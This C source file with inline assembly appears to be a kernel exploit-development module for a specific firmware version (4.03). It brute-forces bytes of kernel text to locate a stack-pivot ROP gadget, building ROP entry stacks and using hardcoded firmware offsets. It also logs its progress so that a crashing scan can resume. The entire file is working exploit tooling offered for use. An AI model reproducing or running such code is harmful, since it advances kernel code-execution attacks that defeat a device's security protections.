#include <stdint.h>

/*
 * batch_pivot_scan — Systematic ktext pivot gadget scanner
 *
 * Tests every byte in a configurable range of ktext for:
 *   xchg rsp, rax; ret  (48 94 C3)
 *   push rax; pop rsp; ret  (50 5C C3)
 *   mov rsp, rax; ret  (48 89 C4 C3)
 *   Or any other sequence that redirects RSP to RAX
 *
 * Strategy: for each candidate byte address, set RAX = &pivot_chain
 * (a controlled buffer), call candidate via ROP, detect if RSP was
 * redirected to pivot_chain. Fill the ROP entry stack with resume
 * addresses so most candidates return safely to the loop.
 *
 * Configure via -D flags:
 *   SCAN_START_OFF: offset from kdata_base (negative = ktext)
 *   SCAN_COUNT: number of bytes to test (max ~4096 per run)
 *
 * Output layout (uint64_t indices):
 *   [0]  magic "BPVT" (0x42505654) | status(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  scan_start address
 *   [4]  scan_count
 *   [5]  last_tested_index (if thread dies, resume from here + 1)
 *   [6]  found_offset (ktext-relative offset of pivot, or 0 if not found)
 *   [7]  found_addr (absolute address of pivot, or 0)
 *   [8]  num_survived (how many candidates returned without crashing)
 *   [9]  num_tested (total candidates attempted)
 */

#ifndef SCAN_START_OFF
#define SCAN_START_OFF  (-0x968bbb)  /* default: some safe ktext offset */
#endif
#ifndef SCAN_COUNT
#define SCAN_COUNT  256
#endif

#define MAGIC_BPVT    0x42505654  /* "BPVT" */

/* FW 4.03 offsets */
#define OFF_WRMSR_RET     (-0x9d20cc)
#define OFF_NOP_RET       (OFF_WRMSR_RET + 2)

/* Entry stack: candidate + many resume addresses for safety */
#define ENTRY_STK_SIZE    32

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/* State shared between C and asm */
static volatile uint64_t scan_saved_rsp;
static volatile uint64_t scan_resume_normal;
static volatile uint64_t scan_resume_pivot;
static volatile int scan_got_pivot;

/* Pivot chain: where RSP goes if candidate pivots */
static volatile uint64_t pivot_chain[4];

/* Entry stack: [candidate, resume, resume, resume, ...] */
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

__attribute__((naked, used))
static void pivot_landing_batch(void)
{
    __asm__ volatile(
        "movq $1, scan_got_pivot(%%rip)\n\t"
        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *scan_resume_pivot(%%rip)\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    uint64_t scan_start = kdata_base + SCAN_START_OFF;
    int scan_count = SCAN_COUNT;

    volatile uint64_t* out = (volatile uint64_t*)args;
    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_BPVT; /* status=TRYING */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = scan_start;
    out[4] = scan_count;
    out[5] = 0;  /* last_tested_index */
    out[6] = 0;  /* found_offset */
    out[7] = 0;  /* found_addr */
    out[8] = 0;  /* num_survived */
    out[9] = 0;  /* num_tested */

    /* Set up pivot chain (where RSP goes if pivot works) */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing_batch;
    pivot_chain[3] = nop_ret;

    scan_got_pivot = 0;
    int survived = 0;

    for (int i = 0; i < scan_count; i++) {
        uint64_t candidate = scan_start + i;

        /* Record progress BEFORE attempting (survives thread death) */
        out[5] = i;
        out[9] = i + 1;

        /* Fill entry stack: candidate first, then all resume addresses */
        entry_stk[0] = candidate;
        /* Fill the rest with resume address (set by asm below).
           This handles candidates that pop 0..30 values before ret. */

        scan_got_pivot = 0;

        __asm__ volatile(
            /* Set resume targets */
            "leaq 1f(%%rip), %%rcx\n\t"
            "movq %%rcx, scan_resume_normal(%%rip)\n\t"
            "leaq 2f(%%rip), %%rcx\n\t"
            "movq %%rcx, scan_resume_pivot(%%rip)\n\t"

            /* Fill entry_stk[1..31] with normal resume address */
            "leaq entry_stk(%%rip), %%rdx\n\t"
            "leaq 1f(%%rip), %%rcx\n\t"
            ".set j, 1\n\t"
            ".rept 31\n\t"
            "movq %%rcx, (j*8)(%%rdx)\n\t"
            ".set j, j+1\n\t"
            ".endr\n\t"

            /* Save RSP */
            "movq %%rsp, scan_saved_rsp(%%rip)\n\t"

            /* RAX = pivot_chain (the controlled buffer) */
            "leaq pivot_chain(%%rip), %%rax\n\t"

            /* Switch RSP to entry stack and go */
            "leaq entry_stk(%%rip), %%rsp\n\t"
            "retq\n\t"

            /* Normal resume: candidate returned without pivoting */
            "1:\n\t"
            "movq scan_saved_rsp(%%rip), %%rsp\n\t"
            "jmp 3f\n\t"

            /* Pivot resume: candidate DID pivot RSP to our buffer! */
            "2:\n\t"
            "movq scan_saved_rsp(%%rip), %%rsp\n\t"

            "3:\n\t"
            :
            :
            : "rax", "rcx", "rdx", "memory", "cc"
        );

        if (scan_got_pivot) {
            /* FOUND A PIVOT GADGET! */
            out[6] = candidate - ktext_base;  /* ktext-relative offset */
            out[7] = candidate;                /* absolute address */
            out[0] = ((uint64_t)0x0002 << 32) | MAGIC_BPVT; /* PIVOT status */
            out[8] = survived;
            return 0;
        }

        survived++;
    }

    /* Completed full scan, no pivot found */
    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_BPVT; /* DONE status */
    out[8] = survived;
    return 0;
}
